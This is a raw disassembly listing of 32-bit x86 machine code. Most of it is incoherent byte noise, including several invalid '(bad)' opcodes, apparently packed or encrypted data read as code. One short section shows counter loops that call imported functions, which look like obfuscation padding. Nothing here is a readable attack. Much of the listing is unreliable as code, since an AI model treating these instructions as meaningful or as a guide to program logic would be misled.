  40d567:	xorps  xmm2,XMMWORD PTR [edi+0x62]
  40d56b:	pop    esi
  40d56c:	sbb    al,0xd0
  40d56e:	jno    0x40d574
  40d570:	jae    0x40d536
  40d572:	or     eax,0xdb4cd830
  40d577:	jmp    0xb918:0x8693810c
  40d57e:	out    dx,al
  40d57f:	jnp    0x40d512
  40d581:	adc    DWORD PTR [ecx+0x47],ebp
  40d584:	fadd   DWORD PTR [edi-0x7bfe6774]
  40d58a:	cwde   
  40d58b:	or     dl,BYTE PTR [ecx+0x40]
  40d58e:	inc    ecx
  40d58f:	sub    dh,BYTE PTR ds:0x7a12a613
  40d595:	test   BYTE PTR [edi-0x70],al
  40d598:	and    eax,0xfd797163
  40d59d:	mov    ds:0xb5d4e8fb,eax
  40d5a2:	jle    0x40d5a7
  40d5a4:	aas    
  40d5a5:	retf   0x9b84
  40d5a8:	sub    ebx,DWORD PTR [ebp+0x21d1c79a]
  40d5ae:	fwait
  40d5af:	dec    edi
  40d5b0:	cmc    
  40d5b1:	iret   
  40d5b2:	push   0x44
  40d5b4:	sti    
  40d5b5:	mov    bh,0x43
  40d5b7:	sar    BYTE PTR [ecx],0x98
  40d5ba:	mov    ss,WORD PTR [edi+edi*1+0x4e5bfdfc]
  40d5c1:	xor    al,0xdf
  40d5c3:	push   ds
  40d5c4:	mov    bl,0xf9
  40d5c6:	stc    
  40d5c7:	mov    edi,0xd11350d2
  40d5cc:	dec    ecx
  40d5cd:	xor    al,0x23
  40d5cf:	stos   BYTE PTR es:[edi],al
  40d5d0:	js     0x40d55e
  40d5d2:	std    
  40d5d3:	jno    0x40d5c9
  40d5d5:	adc    dl,bl
  40d5d7:	inc    esp
  40d5d8:	jge    0x40d57f
  40d5da:	cmp    eax,0x38032f8c
  40d5df:	and    dl,bl
  40d5e1:	mov    ds:0x93cbe313,al
  40d5e6:	pop    edi
  40d5e7:	ror    DWORD PTR cs:[edi-0x11824119],1
  40d5ee:	adc    ebp,eax
  40d5f0:	add    esi,DWORD PTR ds:0x70f2aa9
  40d5f6:	sahf   
  40d5f7:	or     BYTE PTR [edx+0x3d],dl
  40d5fa:	hlt    
  40d5fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5fc:	shr    dl,0x1b
  40d5ff:	pop    eax
  40d600:	stc    
  40d601:	into   
  40d602:	xchg   ecx,eax
  40d603:	jg     0x40d67c
  40d605:	mov    ?,WORD PTR [ecx+0x148424d5]
  40d60b:	xchg   edi,eax
  40d60c:	jle    0x40d673
  40d60e:	lods   al,BYTE PTR ds:[esi]
  40d60f:	hlt    
  40d610:	pop    esi
  40d611:	out    0xc2,eax
  40d613:	jb     0x40d5e1
  40d615:	lods   eax,DWORD PTR ds:[esi]
  40d616:	push   esp
  40d617:	inc    edx
  40d618:	pop    ss
  40d619:	jp     0x40d655
  40d61b:	xor    esp,DWORD PTR [esi]
  40d61d:	(bad)  
  40d61e:	fcom   DWORD PTR [ebx+0x7c4661c6]
  40d624:	jmp    0x7617afb1
  40d629:	adc    DWORD PTR [ebx+0x3d],esi
  40d62c:	cmp    eax,0x27d71f9a
  40d631:	call   0x8efc:0xecf72bcf
  40d638:	and    cl,ch
  40d63a:	inc    esp
  40d63b:	push   edx
  40d63c:	in     eax,dx
  40d63d:	hlt    
  40d63e:	mov    dh,0xfb
  40d640:	adc    DWORD PTR [ebx-0x62c2ec6d],0xffffff9d
  40d647:	mov    eax,0x469c15a8
  40d64c:	mov    al,0x92
  40d64e:	mov    cl,0x94
  40d650:	xor    BYTE PTR [ebx-0x74],cl
  40d653:	pusha  
  40d654:	adc    DWORD PTR [ebp+0x6b297781],ebx
  40d65a:	(bad)  
  40d65c:	inc    esp
  40d65d:	popf   
  40d65e:	push   ebp
  40d65f:	sub    eax,0x68695996
  40d664:	adc    esp,0xffffff97
  40d667:	sbb    BYTE PTR [edi+0x7c],ah
  40d66a:	arpl   WORD PTR [ecx-0x43],bx
  40d66d:	out    0x22,al
  40d66f:	xor    BYTE PTR [ebp-0x655fc162],bh
  40d675:	out    dx,al
  40d676:	mov    DWORD PTR [esi-0x55b74ee2],0x1e9565cb
  40d680:	js     0x40d6d7
  40d682:	mov    ebp,0xacaf37e3
  40d687:	mov    ds:0x6a5f0b7e,al
  40d68c:	push   0xed6dc845
  40d691:	mov    esp,0xce499c49
  40d696:	inc    ebp
  40d697:	pushf  
  40d698:	pop    edi
  40d699:	out    0x4,al
  40d69b:	or     BYTE PTR [edx-0x77d06fb3],cl
  40d6a1:	mov    al,0x89
  40d6a3:	stos   DWORD PTR es:[edi],eax
  40d6a4:	sub    BYTE PTR [edx],bh
  40d6a6:	and    BYTE PTR [ebx+0x30],ah
  40d6a9:	mov    bh,0x56
  40d6ab:	xchg   ebp,eax
  40d6ac:	add    DWORD PTR [ecx+0x76],esi
  40d6af:	push   edx
  40d6b0:	ss dec esp
  40d6b2:	daa    
  40d6b3:	lahf   
  40d6b4:	aam    0x1f
  40d6b6:	mov    al,0x82
  40d6b8:	push   ebp
  40d6b9:	or     al,0xf4
  40d6bb:	mov    eax,0x85966dac
  40d6c0:	jge    0x40d672
  40d6c2:	jl     0x40d6e7
  40d6c4:	and    ah,bh
  40d6c6:	push   ebx
  40d6c7:	pop    ds
  40d6c8:	cmp    DWORD PTR [ebx],esp
  40d6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6cb:	out    0x6,al
  40d6cd:	push   edx
  40d6ce:	aas    
  40d6cf:	adc    eax,0x8fb4c5e4
  40d6d4:	jnp    0x40d69b
  40d6d6:	mov    ebx,0x3856121c
  40d6db:	ins    BYTE PTR es:[edi],dx
  40d6dc:	inc    edx
  40d6dd:	popf   
  40d6de:	jnp    0x40d735
  40d6e0:	mov    edx,DWORD PTR [ebp-0x3f]
  40d6e3:	inc    ebp
  40d6e4:	loopne 0x40d6e5
  40d6e6:	bnd je 0x40d703
  40d6e9:	outs   dx,BYTE PTR ds:[esi]
  40d6ea:	sub    dl,BYTE PTR [edx+0x4b993c8a]
  40d6f0:	push   esi
  40d6f1:	fisttp WORD PTR [eax+0x1c3f88cb]
  40d6f7:	call   0x73fad5f4
  40d6fc:	inc    ebp
  40d6fd:	add    BYTE PTR [eax],al
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43441d,0x432dde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434411,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432dca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432dca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432dca,ecx
  40d749:	cmp    DWORD PTR ds:0x432dca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432dca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432c72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434386,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434386
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434386,ecx
  40d78a:	cmp    DWORD PTR ds:0x434386,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4328db
  40d79c:	push   0x43287d
  40d7a1:	call   DWORD PTR ds:0x4329f6
  40d7a7:	cmp    DWORD PTR ds:0x434386,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434386
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434386,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434386,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434396,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434396
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434396,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434396,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434396,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4329fa
  40d813:	cmp    DWORD PTR ds:0x434396,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434396
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434396,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432de2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432704,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0x2a
  40d85b:	cmp    BYTE PTR [esi],al
  40d85d:	add    DWORD PTR [edi-0x76],edx
  40d860:	jo     0x40d8d2
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d8bc
  40d867:	mov    al,ds:0x6d055214
  40d86c:	ret    0x4ca
  40d86f:	in     al,0x8
  40d871:	in     al,0x61
  40d873:	in     eax,dx
  40d874:	out    dx,eax
  40d875:	inc    esp
  40d876:	mov    dh,BYTE PTR [esi]
  40d878:	retf   0x3d0f
  40d87b:	scas   al,BYTE PTR es:[edi]
  40d87c:	inc    edx
  40d87d:	in     al,dx
  40d87e:	outs   dx,DWORD PTR ds:[esi]
  40d87f:	mov    bh,0xa5
  40d881:	into   
  40d882:	dec    ecx
  40d883:	sbb    bl,ch
  40d885:	jne    0x40d89f
  40d887:	nop
  40d888:	jne    0x40d819
  40d88a:	pusha  
  40d88b:	sub    esi,esp
  40d88d:	mov    bh,0xb1
  40d88f:	jne    0x40d8f1
  40d891:	data16 loope 0x40d904
  40d894:	pop    ebp
  40d895:	inc    esp
  40d896:	or     eax,0x509dc941
  40d89b:	sbb    eax,0x2fb10665
  40d8a0:	push   0x48
  40d8a2:	pop    ebp
  40d8a3:	int    0xda
  40d8a5:	in     eax,0x35
  40d8a7:	fdiv   QWORD PTR [ebp+0x7f]
  40d8aa:	push   0x0
  40d8ac:	jae    0x40d8da
  40d8ae:	mov    ebx,DWORD PTR [ecx]
  40d8b0:	mov    ebp,esi
  40d8b2:	and    esp,DWORD PTR [eax+0x23]
  40d8b5:	test   BYTE PTR [eax-0x64627a3],bl
  40d8bb:	test   DWORD PTR [ebx],0xf8552a54
  40d8c1:	xor    ch,BYTE PTR [ecx+eax*4-0x6e]
  40d8c5:	cmp    BYTE PTR [esi],ah
  40d8c7:	push   ecx
  40d8c8:	das    
  40d8c9:	sbb    BYTE PTR [eax+eax*8+0x3cca586d],dl
  40d8d0:	outs   dx,BYTE PTR ds:[esi]
  40d8d1:	xor    ebx,edx
  40d8d3:	sbb    eax,DWORD PTR [ebx+0x61c7aacf]
  40d8d9:	ret    
  40d8da:	retf   
  40d8db:	outs   dx,BYTE PTR ds:[esi]
  40d8dc:	stc    
  40d8dd:	xchg   ebp,eax
  40d8de:	fs mov dl,0x58
  40d8e1:	lahf   
  40d8e2:	add    ecx,DWORD PTR [ebx+0x30b51eb]
  40d8e8:	inc    BYTE PTR [eax+0x226be4a3]
  40d8ee:	lea    eax,[ebp+0x67c71d1f]
  40d8f4:	ss adc eax,0x96025fe4
  40d8fa:	loope  0x40d95d
  40d8fc:	hlt    
  40d8fd:	pop    edx
  40d8fe:	mov    edx,0x2c02aa3c
  40d903:	sbb    eax,0x222118eb
  40d908:	push   ebp
  40d909:	rcr    DWORD PTR [ebp-0x3a59a212],cl
  40d90f:	dec    esp
  40d910:	mov    ds:0x1702d402,al
  40d915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d916:	dec    ebp
  40d917:	dec    esi
  40d918:	sub    DWORD PTR ds:0x88b00761,0x66
  40d91f:	bound  edx,QWORD PTR [eax-0x1dc1bfb5]
  40d925:	popa   
  40d926:	(bad)  [esi-0x1e44146]
  40d92c:	pop    edx
  40d92d:	push   cs
  40d92e:	pop    esp
  40d92f:	out    dx,eax
  40d930:	ins    DWORD PTR es:[edi],dx
  40d931:	mov    esi,0xdb779486
  40d936:	lea    edi,[ebp+0x2a]
  40d939:	enter  0xc7df,0x89
  40d93d:	xor    al,0x93
  40d93f:	(bad)  
  40d940:	push   eax
  40d941:	fisttp WORD PTR [ecx+0x1ed745]
  40d947:	out    0x3,al
  40d949:	jmp    0x40d96a
  40d94b:	pop    edi
  40d94c:	cmp    al,0x65
  40d94e:	fwait
  40d94f:	dec    ebp
  40d950:	jp     0x40d99c
  40d952:	sbb    al,bl
  40d954:	popa   
  40d955:	adc    DWORD PTR [ecx-0x1c],esp
  40d958:	inc    eax
  40d959:	daa    
  40d95a:	jmp    0x40d9c9
  40d95c:	cmp    ecx,DWORD PTR [esi]
  40d95e:	gs cmp ebx,esi
  40d961:	hlt    
  40d962:	push   edx
  40d963:	jle    0x40d8ea
  40d965:	mov    esi,0xc0b0f02e
  40d96a:	inc    eax
  40d96b:	fmulp  st(0),st
  40d96d:	jl     0x40d95b
  40d96f:	pushf  
  40d970:	in     al,0xca
  40d972:	cmp    BYTE PTR [edx],ch
  40d974:	stos   DWORD PTR es:[edi],eax
  40d975:	push   0x2b
  40d977:	fsubr  DWORD PTR es:[edx-0x675f82c]
  40d97e:	jno    0x40d989
  40d980:	xor    eax,0xd0b8fb74
  40d985:	(bad)  
  40d986:	pop    eax
  40d987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d988:	inc    esi
  40d989:	jne    0x40d925
  40d98b:	scas   eax,DWORD PTR es:[edi]
  40d98c:	jo     0x40d991
  40d98e:	lods   eax,DWORD PTR ds:[esi]
  40d98f:	gs pop edi
  40d991:	dec    esi
  40d992:	mov    esp,0xc085e86b
  40d997:	lods   al,BYTE PTR ds:[esi]
  40d998:	aam    0x25
  40d99a:	pusha  
  40d99b:	lods   eax,DWORD PTR ds:[esi]
  40d99c:	jle    0x40d97f
  40d99e:	sbb    eax,0xaf318b12
  40d9a3:	add    al,0x3c
  40d9a5:	or     al,0x59
  40d9a7:	cdq    
  40d9a8:	int3   
  40d9a9:	push   ecx
  40d9aa:	dec    ecx
  40d9ab:	jmp    0xa441:0x1464cd94
  40d9b2:	adc    al,dl
  40d9b4:	cmp    BYTE PTR ds:0x5efcf6ac,ch
  40d9ba:	or     eax,DWORD PTR [edx]
  40d9bc:	test   DWORD PTR [eax-0x3],edi
  40d9bf:	lods   eax,DWORD PTR ds:[esi]
  40d9c0:	clc    
  40d9c1:	push   ebx
  40d9c2:	in     eax,0x49
  40d9c4:	mov    eax,0x88164ce3
  40d9c9:	pop    ebp
  40d9ca:	cmp    BYTE PTR [edi-0x2497e8a8],ch
  40d9d0:	sub    ch,BYTE PTR [esi]
  40d9d2:	outs   dx,BYTE PTR ds:[esi]
  40d9d3:	clc    
  40d9d4:	and    DWORD PTR [eax+0xfc4dc0a],esi
  40d9da:	push   ss
  40d9db:	sbb    BYTE PTR [ecx+0x5f],0x99
  40d9df:	loop   0x40d9d6
  40d9e1:	or     eax,DWORD PTR [esp+edi*4+0x24]
  40d9e5:	leave  
  40d9e6:	pushf  
  40d9e7:	fwait
  40d9e8:	popa   
  40d9e9:	outs   dx,BYTE PTR ds:[esi]
  40d9ea:	xlat   BYTE PTR ds:[ebx]
  40d9eb:	and    dh,BYTE PTR [eax+edx*1]
  40d9ee:	aaa    
  40d9ef:	lods   al,BYTE PTR ds:[esi]
  40d9f0:	dec    ebp
  40d9f1:	dec    ecx
  40d9f2:	cmp    dl,0x6b
  40d9f5:	(bad)  
  40d9f6:	(bad)  
  40d9f7:	and    bl,BYTE PTR [ecx+0x42]
  40d9fa:	ss cmp al,0xfd
  40d9fd:	fcomip st,st(0)
  40d9ff:	mov    edx,0x978b3cf1
  40da04:	cmp    eax,DWORD PTR [eax-0x6ab8070c]
  40da0a:	or     bl,BYTE PTR [ecx-0x2ccf58a9]
  40da10:	aaa    
  40da11:	imul   edx,eax,0xc
  40da14:	mov    al,0x22
  40da16:	cli    
  40da17:	jns    0x40da73
  40da19:	sbb    BYTE PTR ds:0x605d979f,dl
  40da1f:	push   ecx
  40da20:	enter  0x313c,0xbe
  40da24:	dec    esi
  40da25:	nop
  40da26:	jp     0x40da08
  40da28:	ins    BYTE PTR es:[edi],dx
  40da29:	(bad)  
  40da2a:	jb     0x40da49
  40da2c:	xor    al,0x89
  40da2e:	out    dx,eax
  40da2f:	mov    DWORD PTR [esi-0x5741a48],ebp
  40da35:	pop    esi
  40da36:	push   ebp
  40da37:	stos   DWORD PTR es:[edi],eax
  40da38:	rcr    DWORD PTR [edx],0x2a
  40da3b:	fiadd  DWORD PTR [edx+edi*8]
  40da3e:	into   
  40da3f:	pop    ss
  40da40:	jno    0x40d9e9
  40da42:	inc    edi
  40da43:	or     al,0x5a
  40da45:	pop    es
  40da46:	lods   eax,DWORD PTR ds:[esi]
  40da47:	xor    dl,ah
  40da49:	push   0xffffffbd
  40da4b:	div    BYTE PTR [edx+0x399bad85]
  40da51:	adc    edx,0x4df29e5e
  40da57:	adc    bl,BYTE PTR [ebp+0x39e455f8]
  40da5d:	lods   al,BYTE PTR ds:[esi]
  40da5e:	adc    DWORD PTR [ecx+ecx*4-0x40],esp
  40da62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da63:	xchg   esi,eax
  40da64:	cld    
  40da65:	sub    ebx,eax
  40da67:	sar    esi,0xa7
  40da6a:	into   
  40da6b:	and    BYTE PTR [eax+0x3b9cc480],dl
  40da71:	mov    esi,0x122790d4
  40da76:	test   al,0xa1
  40da78:	xchg   ebx,eax
  40da79:	fmul   QWORD PTR [edi-0x5a]
  40da7c:	rol    eax,cl
  40da7e:	aaa    
  40da7f:	xchg   ebp,eax
  40da80:	dec    eax
  40da81:	push   0xffffffa4
  40da83:	xor    BYTE PTR [eax],0x65
  40da86:	rol    ah,cl
  40da88:	jmp    0xcc3255a
  40da8d:	int3   
  40da8e:	mov    ds:0x9c38e661,eax
  40da93:	rol    BYTE PTR [ecx-0x422b7818],1
  40da99:	sbb    dl,BYTE PTR [eax+0x7b144ee2]
  40da9f:	sbb    ebp,DWORD PTR [ecx-0x5a]
  40daa2:	sbb    DWORD PTR [eax+eiz*8],0xd37c993e
  40daa9:	lahf   
  40daaa:	test   eax,0x5e067af6
  40daaf:	mov    bh,0x39
  40dab1:	cli    
  40dab2:	ja     0x40da84
  40dab4:	sbb    DWORD PTR [edi-0x351960a5],edx
  40daba:	jb     0x40db28
  40dabc:	hlt    
  40dabd:	jmp    0x5a20:0x9b9eccf4
  40dac4:	clc    
  40dac5:	push   eax
  40dac6:	fsub   QWORD PTR [ebp+0x2b445b41]
  40dacc:	ja     0x40dade
  40dace:	adc    al,0xaf
  40dad0:	push   edi
  40dad1:	jmp    0x40da98
  40dad3:	pop    ds
  40dad4:	add    eax,0xf41b98a1
  40dad9:	mov    eax,ds:0xcbc5038b
  40dade:	test   eax,0x554428c7
  40dae3:	pop    ebx
  40dae4:	mov    ah,BYTE PTR [esi+0x44]
  40dae7:	cmp    eax,0xb0de92c3
  40daec:	sbb    BYTE PTR [eax-0x21c4ebec],al
  40daf2:	mov    BYTE PTR [esi-0x3d],dl
  40daf5:	xor    eax,0x9d719cc4
  40dafa:	(bad)  
  40dafb:	aad    0x74
  40dafd:	mov    ebx,0xb95ea484
  40db02:	add    bh,ah
  40db04:	fldcw  WORD PTR [edi]
  40db06:	mov    ebx,0x811d4093
  40db0b:	jbe    0x40db68
  40db0d:	xchg   ecx,eax
  40db0e:	pop    edi
  40db0f:	div    ah
  40db11:	push   ebx
  40db12:	ins    DWORD PTR es:[edi],dx
  40db13:	aaa    
  40db14:	pusha  
  40db15:	inc    eax
  40db16:	sbb    al,0x11
  40db18:	add    al,0x31
  40db1a:	or     ebx,esp
  40db1c:	lock pop ebp
  40db1e:	stos   DWORD PTR es:[edi],eax
  40db1f:	push   esp
  40db20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db21:	retf   0x43bb
  40db24:	mov    ds:0x67973c4a,al
  40db29:	out    dx,eax
  40db2a:	dec    eax
  40db2b:	mov    dh,ch
  40db2d:	adc    bh,al
  40db2f:	daa    
  40db30:	ins    BYTE PTR es:[edi],dx
  40db31:	sub    dl,ch
  40db33:	add    DWORD PTR [edx],0x57d1665
  40db39:	dec    eax
  40db3a:	inc    edi
  40db3b:	inc    esi
  40db3c:	call   0xdf8a:0x5d796e98
  40db43:	adc    DWORD PTR [ecx-0x2d5e2bec],edx
  40db49:	in     eax,dx
  40db4a:	xor    DWORD PTR [eax-0x2f60ec2b],0xffffffc6
  40db51:	(bad)  
  40db52:	or     ah,BYTE PTR [edx]
  40db54:	cmc    
  40db55:	dec    ebp
  40db56:	retf   
  40db57:	stc    
  40db58:	in     al,0x5e
  40db5a:	(bad)  
  40db5b:	cmp    eax,0x479bc305
  40db60:	popf   
  40db61:	xchg   ecx,eax
  40db62:	ds scas al,BYTE PTR es:[edi]
  40db64:	in     al,dx
  40db65:	ins    BYTE PTR es:[edi],dx
  40db66:	pop    ss
  40db67:	daa    
  40db68:	inc    DWORD PTR [edi]
  40db6a:	or     al,0xea
  40db6c:	cmp    ebx,DWORD PTR [edi-0x74]
  40db6f:	push   ecx
  40db70:	aam    0xb3
  40db72:	rcl    DWORD PTR [eax+0x4465af08],0xdb
  40db79:	push   cs
  40db7a:	in     eax,dx
  40db7b:	fld    QWORD PTR [eax+0x65]
  40db7e:	xor    BYTE PTR [esi+0x21c7b30d],dh
  40db84:	jl     0x40db25
  40db86:	cmp    bl,ch
  40db88:	shl    BYTE PTR [esi],1
  40db8a:	loopne 0x40dbf8
  40db8c:	cli    
  40db8d:	xchg   ebp,eax
  40db8e:	xchg   edi,eax
  40db8f:	retf   
  40db90:	jecxz  0x40dbb2
  40db92:	test   BYTE PTR [ebp-0x19e0d6c1],0x71
  40db99:	aas    
  40db9a:	sub    eax,0x3f21d2df
  40db9f:	jmp    0x921775cc
  40dba4:	scas   al,BYTE PTR es:[edi]
  40dba5:	sbb    al,0x4a
  40dba7:	mov    bl,0xd6
  40dba9:	test   bh,bh
  40dbab:	jl     0x40dc25
  40dbad:	sbb    al,0x56
  40dbaf:	mov    DWORD PTR [ebp+0x2c],ecx
  40dbb2:	adc    edx,DWORD PTR gs:[eax-0x6d]
  40dbb6:	and    BYTE PTR [ebp-0x2c],cl
  40dbb9:	jecxz  0x40dbe9
  40dbbb:	cwde   
  40dbbc:	pop    ss
  40dbbd:	repz pusha 
  40dbbf:	outs   dx,DWORD PTR ds:[esi]
  40dbc0:	jns    0x40dbd0
  40dbc2:	push   ss
  40dbc3:	sbb    edx,DWORD PTR [eax+0x662c7b24]
  40dbc9:	mov    dl,0xef
  40dbcb:	mov    ecx,DWORD PTR [edx-0x78]
  40dbce:	jge    0x40dbef
  40dbd0:	jnp    0x40dbdd
  40dbd2:	mov    al,ds:0x5fd71979
  40dbd7:	aam    0xd4
  40dbd9:	add    BYTE PTR [eax+0x1acf19b5],dh
  40dbdf:	lahf   
  40dbe0:	mov    bl,BYTE PTR [esi+ecx*8]
  40dbe3:	rcl    DWORD PTR [edx-0x4e],0xde
  40dbe7:	xchg   edi,eax
  40dbe8:	(bad)  
  40dbe9:	ja     0x40dc5f
  40dbeb:	sbb    eax,0x33baa4de
  40dbf0:	pop    edx
  40dbf1:	jp     0x40dbe4
  40dbf3:	inc    ebx
  40dbf4:	pop    ebx
  40dbf5:	scas   al,BYTE PTR es:[edi]
  40dbf6:	xor    BYTE PTR [ebp-0x4f],al
  40dbf9:	mov    eax,0x72597b31
  40dbfe:	out    dx,al
  40dbff:	sbb    dh,BYTE PTR [eax+edi*8-0x6bd15cb6]
  40dc06:	inc    edi
  40dc07:	fnstenv [ebx+0x129b86ef]
  40dc0d:	fiadd  WORD PTR [esi+0x75]
  40dc10:	pop    ecx
  40dc11:	ins    DWORD PTR es:[edi],dx
  40dc12:	mov    al,ds:0x33befe77
  40dc17:	xchg   ebp,eax
  40dc18:	adc    ah,ah
  40dc1a:	dec    eax
  40dc1b:	fwait
  40dc1c:	aad    0x66
  40dc1e:	iret   
  40dc1f:	jb     0x40dbe3
  40dc21:	inc    esp
  40dc22:	sbb    eax,0x64dbcad
  40dc27:	and    DWORD PTR [ebx+0x473eaa8c],ecx
  40dc2d:	mov    WORD PTR [esp+ebp*1-0x591e213c],ss
  40dc34:	lods   al,BYTE PTR ds:[esi]
  40dc35:	rcl    DWORD PTR [esi-0x75bd1c43],cl
  40dc3b:	ficom  WORD PTR [esi-0x74078a77]
  40dc41:	or     eax,0x43439a
  40dc46:	and    DWORD PTR ds:0x432dc6,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
  40dc4f:	and    DWORD PTR ds:0x4326f8,0x434411
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dcce
  40dc6d:	pop    ebp
  40dc6e:	das    
  40dc6f:	pop    esp
  40dc70:	mov    al,ds:0x49707096
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dc7c
  40dc79:	mov    ebp,0xa9adcc3f
  40dc7e:	adc    al,0xe8
  40dc80:	fwait
  40dc81:	or     dl,BYTE PTR [eax+0x30ada475]
  40dc87:	xchg   esp,ebx
  40dc89:	rol    BYTE PTR [esi-0x79565005],cl
  40dc8f:	xor    edi,DWORD PTR [ebp+0x29d82350]
  40dc95:	cli    
  40dc96:	ins    BYTE PTR es:[edi],dx
  40dc97:	fdivr  QWORD PTR [eax-0x1d]
  40dc9a:	fs jl  0x40dce5
  40dc9d:	ins    DWORD PTR es:[edi],dx
  40dc9e:	push   ss
  40dc9f:	push   ecx
  40dca0:	inc    ecx
  40dca2:	add    BYTE PTR [eax+0x3f409b26],dl
  40dca8:	add    esp,DWORD PTR [edx-0x5fb93929]
  40dcae:	dec    esi
  40dcaf:	dec    ecx
  40dcb0:	ins    DWORD PTR es:[edi],dx
  40dcb1:	lock push ebp
  40dcb3:	es xchg edx,eax
  40dcb5:	sub    ebp,DWORD PTR [eax]
  40dcb7:	jae    0x40dd04
  40dcb9:	inc    ebx
  40dcba:	push   cs
  40dcbb:	mov    ecx,0x7ab38428
  40dcc0:	adc    eax,0x1b39eb28
  40dcc5:	lea    ebp,[edi+0x4fddcf58]
  40dccb:	xchg   ebp,eax
  40dccc:	push   eax
  40dccd:	popf   
  40dcce:	popa   
  40dccf:	mov    ebx,0xd628fb9b
  40dcd4:	xor    dl,BYTE PTR [edx]
  40dcd6:	std    
  40dcd7:	mov    bh,0x40
  40dcd9:	or     ch,dh
  40dcdb:	ror    bh,1
  40dcdd:	jg     0x40dd4e
  40dcdf:	push   es
  40dce0:	adc    DWORD PTR [edi],0x1724f9be
  40dce6:	loop   0x40dc75
  40dce8:	jae    0x40dd5a
  40dcea:	loope  0x40dc84
  40dcec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dced:	push   ss
  40dcee:	mov    BYTE PTR [ebp+0x34],ch
  40dcf1:	xchg   BYTE PTR [ebp+0x47f4cac],ah
  40dcf7:	jl     0x40dc83
  40dcf9:	adc    al,0x4b
  40dcfb:	je     0x40dce7
  40dcfd:	test   bl,al
  40dcff:	jg     0x40dd34
  40dd01:	sub    DWORD PTR [ecx+0x4e931349],0xa1e33e6c
  40dd0b:	add    ecx,DWORD PTR ds:0xe1795fd2
  40dd11:	jno    0x40dcd2
  40dd13:	pop    ss
  40dd14:	inc    edx
  40dd15:	int3   
  40dd16:	div    DWORD PTR [eax-0x34bafc81]
  40dd1c:	sahf   
  40dd1d:	mov    ch,0x0
  40dd1f:	push   cs
  40dd20:	sub    dh,ah
  40dd22:	in     eax,dx
  40dd23:	addr16 mov dh,0x8e
  40dd26:	outs   dx,DWORD PTR ds:[esi]
  40dd27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd28:	or     eax,0xce35e3b6
  40dd2d:	jmp    0x7a7c:0xa3352ef8
  40dd34:	(bad)  
  40dd35:	mov    DWORD PTR [esi-0x7f],ecx
  40dd38:	push   edi
  40dd39:	inc    ebp
  40dd3a:	xchg   ecx,eax
  40dd3b:	mov    edx,0x45ea4ca9
  40dd40:	pop    ecx
  40dd41:	dec    edx
  40dd42:	ror    BYTE PTR [eax+0x15],cl
  40dd45:	mov    bh,0xf9
  40dd47:	js     0x40dd69
  40dd49:	mov    ecx,0xddd63e5f
  40dd4e:	call   0x594289c8
  40dd53:	jecxz  0x40dd8e
  40dd55:	pushf  
  40dd56:	addr16 inc ebp
  40dd58:	sub    edi,DWORD PTR [eax+0x1a12b261]
  40dd5e:	cmp    bl,al
  40dd60:	push   edx
  40dd61:	pop    ebx
  40dd62:	xlat   BYTE PTR ds:[ebx]
  40dd63:	mov    bl,dl
  40dd65:	dec    esp
  40dd66:	ror    BYTE PTR [edi+edi*4-0x72c55e12],1
  40dd6d:	or     esi,DWORD PTR [edx+ecx*8]
  40dd70:	dec    eax
  40dd71:	mov    esi,0x9048e103
  40dd76:	repz inc ecx
  40dd78:	shl    bh,1
